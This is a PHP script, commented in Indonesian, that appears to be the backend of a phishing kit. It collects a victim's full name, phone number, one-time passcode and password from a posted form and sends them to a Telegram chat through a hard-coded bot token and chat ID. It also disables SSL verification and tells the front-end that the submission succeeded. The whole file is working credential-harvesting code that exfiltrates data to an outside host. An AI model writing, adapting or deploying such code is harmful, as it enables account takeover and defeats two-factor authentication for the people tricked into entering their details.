<?php
// Masukkan Token dan Chat ID di sini (Aman, tidak terlihat oleh user)
$token = '7631033651:AAHhj41wsNY5qRTrfGJ_1ouXn9lkz6zJgWM';
$chat_id = '-4932277785';

// Cek apakah ada data yang dikirim via POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Ambil data dari formulir
    $full_name = isset($_POST['full_name']) ? $_POST['full_name'] : '';
    $phone_number = isset($_POST['phone_number']) ? $_POST['phone_number'] : '';
    $otp = isset($_POST['otp']) ? $_POST['otp'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    
    // Susun Pesan
    $message = "<b>Data Baru Masuk:</b>\n";
    if($full_name) $message .= "👤 Nama: " . $full_name . "\n";
    if($phone_number) $message .= "📱 No HP: " . $phone_number . "\n";
    if($otp) $message .= "🔑 OTP: " . $otp . "\n";
    if($password) $message .= "🔒 Password: " . $password . "\n";

    // Kirim ke Telegram menggunakan cURL
    $website = "https://api.telegram.org/bot".$token;
    $params = [
        'chat_id' => $chat_id,
        'text' => $message,
        'parse_mode' => 'html'
    ];

    $ch = curl_init($website . '/sendMessage');
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);

    // Beri respon sukses ke Javascript
    echo "Sukses";
} else {
    echo "Error: Akses ditolak";
}
?>
